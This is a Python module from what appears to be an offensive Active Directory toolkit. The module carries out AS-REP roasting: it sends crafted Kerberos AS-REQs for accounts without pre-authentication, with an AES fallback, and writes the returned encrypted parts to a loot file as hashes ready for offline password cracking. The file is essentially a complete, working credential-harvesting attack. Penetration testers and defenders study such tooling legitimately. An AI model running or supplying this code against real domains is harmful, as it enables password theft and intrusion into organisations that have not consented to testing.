"""AS-REP roasting — harvest crackable hashes for accounts without Kerberos
pre-authentication (userAccountControl & DONT_REQ_PREAUTH).

No credentials are required: the KDC will return an AS-REP whose encrypted part
is derived from the target's password, which can then be cracked offline. Targets
are taken from the graph (flagged by recon/ldap_enum), an explicit --user list,
or a userfile.
"""

from __future__ import annotations

from pathlib import Path

from adreaper.core.context import EngagementContext
from adreaper.core.graph import NodeType
from adreaper.core.logging import log
from adreaper.core.module import BaseModule, ModuleResult, Option, OptionType, Severity
from adreaper.modules.kerberos.common import format_asrep_hash, crack_hint


class AsRepRoast(BaseModule):
    name = "kerberos/asreproast"
    description = "Request AS-REP hashes for accounts without Kerberos pre-auth."
    author = "Mealmeu"
    category = "kerberos"
    requires = ["impacket"]
    references = ["https://attack.mitre.org/techniques/T1558/004/"]
    options = [
        Option("user", "Target user(s), comma-separated (overrides graph targets)",
               type=OptionType.STRING),
        Option("userfile", "File with one username per line", type=OptionType.STRING),
    ]

    def run(self, ctx: EngagementContext) -> ModuleResult:
        res = self.result()
        domain = ctx.domain
        kdc = ctx.dc_ip or ctx.primary_target() or domain
        if not domain:
            return res.fail("no domain set (use --domain)").finish()
        if not kdc:
            return res.fail("no KDC (use --dc-ip)").finish()

        targets = self._targets(ctx)
        if not targets:
            return res.fail(
                "no targets: run recon/ldap_enum first, or pass -o user=a,b / -o userfile=users.txt"
            ).finish()
        log.info("AS-REP roasting %d target(s) via KDC %s", len(targets), kdc)

        hashes: list[str] = []
        for user in targets:
            outcome = self._roast_one(user, domain, kdc)
            if outcome is None:
                continue
            etype, cipher = outcome
            h = format_asrep_hash(etype, user, domain, cipher)
            hashes.append(h)
            log.ok("roasted %s (etype %d)", user, etype)
            res.add_finding(
                f"AS-REP hash captured: {user}",
                Severity.HIGH,
                description="Account has pre-auth disabled; crack this hash offline to recover the password.",
                evidence=h,
                target=user,
                references=self.references + [crack_hint("asrep")],
            )
            node = ctx.graph.get(user) or (ctx.graph.find(user, NodeType.USER)[0]
                                           if ctx.graph.find(user, NodeType.USER) else None)
            if node:
                node.properties["asrep_hash"] = True

        if hashes:
            out = ctx.loot_dir() / "asrep_hashes.txt"
            out.write_text("\n".join(hashes) + "\n", encoding="utf-8")
            res.data["hash_file"] = str(out)
            log.ok("%d hash(es) -> %s", len(hashes), out)
            log.info(crack_hint("asrep"))
        else:
            log.info("no AS-REP hashes captured (targets may all require pre-auth)")
        res.data["captured"] = len(hashes)
        return res.finish()

    # -- target selection -------------------------------------------------

    def _targets(self, ctx: EngagementContext) -> list[str]:
        raw = self.opt("user")
        if raw:
            return [u.strip() for u in raw.split(",") if u.strip()]
        uf = self.opt("userfile")
        if uf:
            return _read_lines(uf)
        # fall back to graph: users flagged without pre-auth by recon
        out = []
        for n in ctx.graph.nodes_of(NodeType.USER):
            if n.properties.get("dont_require_preauth"):
                out.append(n.name)
        return out

    # -- the AS-REQ -------------------------------------------------------

    def _roast_one(self, username: str, domain: str, kdc: str):
        """Return (etype, cipher_bytes) or None if not roastable / not present."""
        import datetime
        import random

        from impacket.krb5 import constants
        from impacket.krb5.asn1 import AS_REP, AS_REQ, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter
        from impacket.krb5.kerberosv5 import KerberosError, sendReceive
        from impacket.krb5.types import KerberosTime, Principal
        from pyasn1.codec.der import decoder, encoder
        from pyasn1.type.univ import noValue

        realm = domain.upper()
        client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        server = Principal(f"krbtgt/{realm}", type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        as_req = AS_REQ()
        as_req["pvno"] = 5
        as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        as_req["padata"] = noValue
        as_req["padata"][0] = noValue
        as_req["padata"][0]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        pac = KERB_PA_PAC_REQUEST()
        pac["include-pac"] = True
        as_req["padata"][0]["padata-value"] = encoder.encode(pac)

        body = as_req["req-body"]
        opts = [constants.KDCOptions.forwardable.value,
                constants.KDCOptions.renewable.value,
                constants.KDCOptions.proxiable.value]
        body["kdc-options"] = constants.encodeFlags(opts)
        seq_set(body, "sname", server.components_to_asn1)
        seq_set(body, "cname", client.components_to_asn1)
        body["realm"] = realm
        till = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        body["till"] = KerberosTime.to_asn1(till)
        body["rtime"] = KerberosTime.to_asn1(till)
        body["nonce"] = random.getrandbits(31)
        seq_set_iter(body, "etype", (int(constants.EncryptionTypes.rc4_hmac.value),))

        try:
            data = sendReceive(encoder.encode(as_req), realm, kdc)
        except KerberosError as e:
            code = e.getErrorCode()
            if code == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # retry allowing AES if RC4 is disabled
                seq_set_iter(body, "etype", (
                    int(constants.EncryptionTypes.rc4_hmac.value),
                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                ))
                try:
                    data = sendReceive(encoder.encode(as_req), realm, kdc)
                except KerberosError as e2:
                    log.debug("%s not roastable: %s", username, e2.getErrorString())
                    return None
            else:
                # PREAUTH_REQUIRED = has pre-auth; PRINCIPAL_UNKNOWN = no such user
                log.debug("%s skipped: %s", username, e.getErrorString())
                return None
        except Exception as e:
            log.debug("%s error: %s", username, e)
            return None

        as_rep = decoder.decode(data, asn1Spec=AS_REP())[0]
        etype = int(as_rep["enc-part"]["etype"])
        cipher = bytes(as_rep["enc-part"]["cipher"].asOctets())
        return etype, cipher


def _read_lines(path: str) -> list[str]:
    try:
        return [ln.strip() for ln in Path(path).read_text(encoding="utf-8").splitlines()
                if ln.strip() and not ln.startswith("#")]
    except OSError as e:
        log.warn("could not read %s: %s", path, e)
        return []
